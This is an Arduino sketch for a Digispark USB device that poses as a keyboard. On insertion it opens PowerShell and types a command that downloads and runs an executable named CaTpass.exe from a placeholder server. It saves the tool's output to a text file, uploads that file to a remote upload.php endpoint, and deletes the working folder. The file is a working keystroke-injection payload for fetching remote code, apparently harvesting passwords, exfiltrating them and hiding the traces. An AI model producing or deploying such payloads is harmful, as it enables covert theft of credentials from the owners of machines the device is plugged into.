    #include "DigiKeyboard.h"

    void setup() {
      // don't need to set anything up to use DigiKeyboard
    }


    void loop() {
      // this is generally not necessary but with some older systems it seems to
      // prevent missing the first character after a delay:
      DigiKeyboard.sendKeyStroke(0);
      
      // Open powershell
      DigiKeyboard.delay(5000);
      DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
      DigiKeyboard.delay(1000);
      DigiKeyboard.print("powershell");
      DigiKeyboard.delay(200);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(1000);
      
      // Execute code from the interwebs
      DigiKeyboard.print("$TempDir = [System.IO.Path]::GetTempPath();cd $TempDir;mkdir CaTpass;cd CaTpass;Invoke-WebRequest \"https://SERVER URL ADRSİ/CaTpass.exe\" -OutFile \"CaTpass.exe\" | Out-Null;.\\CaTpass.exe /scomma CaTpass.txt | Out-Null;Invoke-RestMethod -Uri \"https://SERVER URL ADRSİ /upload.php\" -Method Post -InFile CaTpass.txt -UseDefaultCredentials | Out-Null;cd ..;Remove-Item CaTpass -recurse");
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      while(true){
        //do nothing
      }
    }
